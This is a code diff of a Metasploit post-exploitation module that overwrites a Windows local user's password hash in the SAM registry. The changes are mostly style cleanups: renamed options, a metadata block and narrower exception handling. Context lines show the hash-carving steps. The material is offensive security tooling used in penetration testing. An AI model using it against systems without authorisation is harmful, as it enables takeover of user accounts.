@@ -14,7 +14,9 @@ class MetasploitModule < Msf::Post
       update_info(
         info,
         'Name' => 'Windows Local User Account Hash Carver',
-        'Description' => %q{ This module will change a local user's password directly in the registry. },
+        'Description' => %q{
+          This module will change a local user's password directly in the registry.
+        },
         'License' => MSF_LICENSE,
         'Author' => [ 'p3nt4' ],
         'Platform' => [ 'win' ],
@@ -25,13 +27,18 @@ class MetasploitModule < Msf::Post
               stdapi_registry_open_key
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [CONFIG_CHANGES],
+          'Reliability' => []
         }
       )
-      )
+    )
     register_options(
       [
-        OptString.new('user', [true, 'Username to change password of', nil]),
-        OptString.new('pass', [true, 'Password, NTHash or LM:NT hashes value to set as the user\'s password', nil])
+        OptString.new('USER', [true, 'Username to change password of', nil]),
+        OptString.new('PASS', [true, "Password, NTHash or LM:NT hashes value to set as the user's password", nil])
       ]
     )
     # Constants for SAM decryption
@@ -64,8 +71,8 @@ class MetasploitModule < Msf::Post
     print_line('LM Hash: ' + lmhash)
     print_line('NT Hash: ' + nthash)
     print_status('Searching for user')
-    ridInt = get_user_id(username)
-    rid = '%08x' % ridInt
+    rid_int = get_user_id(username)
+    rid = '%08x' % rid_int
     print_line('User found with id: ' + rid)
     print_status('Loading user key')
     user = get_user_key(rid)
@@ -74,13 +81,13 @@ class MetasploitModule < Msf::Post
     print_status("Calculating the hboot key using SYSKEY #{bootkey.unpack('H*')[0]}...")
     hbootkey = capture_hboot_key(bootkey)
     print_status('Modifying user key')
-    modify_user_key(hbootkey, ridInt, user, [nthash].pack('H*'), [lmhash].pack('H*'))
+    modify_user_key(hbootkey, rid_int, user, [nthash].pack('H*'), [lmhash].pack('H*'))
     print_status('Carving user key')
     write_user_key(rid, user)
     print_status("Completed! Let's hope for the best")
   rescue ::Interrupt
     raise $ERROR_INFO
-  rescue ::Exception => e
+  rescue StandardError => e
     print_error("Error: #{e}")
   end
 
@@ -226,7 +233,7 @@ class MetasploitModule < Msf::Post
       str = ''
       until (bits = key.slice!(0, 7)).empty?
         str << bits
-        str << (bits.count('1').even? ? '1' : '0')  # parity
+        str << (bits.count('1').even? ? '1' : '0') # parity
       end
       keys << [str].pack('B*')
     end
